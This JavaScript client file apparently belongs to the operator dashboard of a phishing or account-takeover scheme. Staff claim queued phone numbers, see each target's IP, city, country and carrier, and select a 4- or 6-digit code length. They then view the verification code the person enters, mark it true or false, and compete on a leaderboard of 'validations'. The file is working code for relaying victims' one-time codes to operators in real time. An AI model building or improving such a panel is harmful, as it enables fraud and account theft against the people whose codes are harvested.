/**
 * app.js — dashboard client
 *
 * State model: a single Map<phone, requestObject>, kept in sync three ways:
 *   1. Initial GET /api/requests on load.
 *   2. Socket.IO events (request:new / request:update / request:remove) —
 *      pushed by EITHER the Discord bot side or another browser tab's
 *      action, so this tab updates without the user doing anything.
 *   3. Optimistic local update right after this tab's own action succeeds
 *      (the server will also broadcast it back, which is a harmless no-op
 *      re-render at that point).
 *
 * request:update payloads are PARTIAL — only the fields that changed are
 * present (Socket.IO/JSON drops undefined keys in transit). mergeRequest()
 * only overwrites the keys it actually received.
 */

const state = { requests: new Map() };

function $(sel, root = document) { return root.querySelector(sel); }

// ─── Toasts ─────────────────────────────────────────────────────────────────

function showToast(message) {
    const el = document.createElement("div");
    el.className = "toast";
    el.textContent = message;
    $("#toasts").appendChild(el);
    setTimeout(() => el.remove(), 6000);
}

// ─── Data layer ───────────────────────────────────────────────────────────────

function mergeRequest(partial) {
    const existing = state.requests.get(partial.phone) || { phone: partial.phone };
    for (const k of Object.keys(partial)) {
        if (partial[k] !== undefined) existing[k] = partial[k];
    }
    state.requests.set(partial.phone, existing);
}

async function loadRequests() {
    const res = await fetch("/api/requests");
    if (!res.ok) { showToast("Could not load the request queue."); return; }
    const rows = await res.json();
    state.requests.clear();
    for (const row of rows) state.requests.set(row.phone, row);
    render();
}

async function loadLeaderboard() {
    const res = await fetch("/api/leaderboard");
    if (!res.ok) return;
    const rows = await res.json();
    const list = $("#leaderboard");
    list.innerHTML = rows.length
        ? rows.map((r, i) => `<li><span><span class="rank">#${i + 1}</span>${escapeHtml(r.staff || "?")}</span><span class="count">${r.validations}</span></li>`).join("")
        : `<li class="empty">No validations logged yet.</li>`;
}

// ─── Actions ──────────────────────────────────────────────────────────────────

async function callAction(path, body) {
    const res = await fetch(path, {
        method: "POST",
        headers: body ? { "Content-Type": "application/json" } : undefined,
        body: body ? JSON.stringify(body) : undefined,
    });
    let data = {};
    try { data = await res.json(); } catch { /* no body */ }
    if (!res.ok || data.success === false) {
        showToast(data.message || `Action failed (${res.status}).`);
        return false;
    }
    return true;
}

const actions = {
    claim:     (phone) => callAction(`/api/requests/${phone}/claim`),
    len4:      (phone) => callAction(`/api/requests/${phone}/length`, { length: 4 }),
    len6:      (phone) => callAction(`/api/requests/${phone}/length`, { length: 6 }),
    wrong:     (phone) => callAction(`/api/requests/${phone}/wrong`),
    unclaim:   (phone) => callAction(`/api/requests/${phone}/unclaim`),
    truecode:  (phone) => callAction(`/api/requests/${phone}/truecode`),
    falsecode: (phone) => callAction(`/api/requests/${phone}/falsecode`),
};

// ─── Rendering ──────────────────────────────────────────────────────────────────

function escapeHtml(s) {
    return String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}

const STATUS_LABEL = {
    pending:        "Unclaimed",
    processing:     "In Progress",
    retry_code:     "Code Rejected",
    waiting_code:   "Awaiting Code",
    code_submitted: "Code Submitted",
};

function claimerHtml(row) {
    if (!row.claimedByDiscordId) return "";
    return `<div class="claimer">👤 Claimed by <code>${escapeHtml(row.claimedByDiscordId)}</code></div>`;
}

function actionsHtml(row) {
    switch (row.status) {
        case "pending":
            return `<button class="btn btn-primary" data-action="claim">📋 Claim</button>`;
        case "processing":
        case "retry_code":
            return `
                <button class="btn btn-success" data-action="len4">🔢 4 digits</button>
                <button class="btn btn-success" data-action="len6">🔢 6 digits</button>
                <button class="btn btn-danger" data-action="wrong">❌ Wrong Number</button>
                <button class="btn btn-secondary" data-action="unclaim">↩️ Unclaim</button>
            `;
        case "waiting_code":
            return `<div class="claimer">⏳ Waiting for the user to enter their ${row.codeLength || "?"}-digit code…</div>`;
        case "code_submitted":
            return `
                <div class="code-display">${escapeHtml((row.staffCode || "").split("").join(" "))}</div>
                <button class="btn btn-success" data-action="truecode">✅ True Code</button>
                <button class="btn btn-danger" data-action="falsecode">❌ False Code</button>
            `;
        default:
            return "";
    }
}

function cardHtml(row) {
    return `
        <div class="card" data-phone="${escapeHtml(row.phone)}">
            <div class="top">
                <div>
                    <div class="username">${escapeHtml(row.username || "—")}</div>
                    <div class="claimer">${escapeHtml(row.phone)} · ${escapeHtml(row.operator || "?")}</div>
                </div>
                <span class="status status-${row.status}">${STATUS_LABEL[row.status] || row.status}</span>
            </div>
            <div class="meta">
                <div>🌍 <code>${escapeHtml(row.country || "?")}</code></div>
                <div>🏙️ <code>${escapeHtml(row.city || "?")}</code></div>
                <div>🌐 <code>${escapeHtml(row.ip || "?")}</code></div>
                <div>🕒 <code>${row.createdAt ? new Date(row.createdAt).toLocaleTimeString() : "?"}</code></div>
            </div>
            ${claimerHtml(row)}
            <div class="actions">${actionsHtml(row)}</div>
        </div>
    `;
}

function render() {
    const buckets = { pending: [], active: [], waiting: [], submitted: [] };
    for (const row of state.requests.values()) {
        if (row.status === "pending") buckets.pending.push(row);
        else if (row.status === "processing" || row.status === "retry_code") buckets.active.push(row);
        else if (row.status === "waiting_code") buckets.waiting.push(row);
        else if (row.status === "code_submitted") buckets.submitted.push(row);
    }
    const byAge = (a, b) => new Date(a.createdAt || 0) - new Date(b.createdAt || 0);
    for (const k of Object.keys(buckets)) buckets[k].sort(byAge);

    renderColumn("#col-pending",   buckets.pending);
    renderColumn("#col-active",    buckets.active);
    renderColumn("#col-waiting",   buckets.waiting);
    renderColumn("#col-submitted", buckets.submitted);
}

function renderColumn(sel, rows) {
    const el = $(sel);
    el.innerHTML = rows.length ? rows.map(cardHtml).join("") : `<div class="empty">Nothing here right now.</div>`;
}

// Delegated click handler — cards are re-rendered wholesale, so listeners are attached once on the container.
document.addEventListener("click", async (e) => {
    const btn = e.target.closest("button[data-action]");
    if (!btn) return;
    const card = btn.closest(".card");
    const phone = card?.dataset.phone;
    const actionName = btn.dataset.action;
    if (!phone || !actions[actionName]) return;

    btn.disabled = true;
    const ok = await actions[actionName](phone);
    // On success the server also broadcasts the update back to us via
    // Socket.IO — this optimistic re-render just avoids a visible delay.
    if (!ok) btn.disabled = false;
});

// ─── Socket.IO ──────────────────────────────────────────────────────────────────

function connectSocket() {
    const socket = io();
    const status = $("#conn");
    socket.on("connect", () => { status.textContent = "🟢 Live"; status.style.color = "#10b981"; });
    socket.on("disconnect", () => { status.textContent = "🔴 Reconnecting…"; status.style.color = "#ef4444"; });

    socket.on("request:new", (row) => { state.requests.set(row.phone, row); render(); });
    socket.on("request:update", (partial) => { mergeRequest(partial); render(); });
    socket.on("request:remove", ({ phone }) => { state.requests.delete(phone); render(); });
}

// ─── Boot ──────────────────────────────────────────────────────────────────────

loadRequests();
loadLeaderboard();
connectSocket();
setInterval(loadLeaderboard, 60_000);
// Safety-net full refresh every 30s in case a socket event was ever missed —
// the live updates above should make this invisible in normal operation.
setInterval(loadRequests, 30_000);
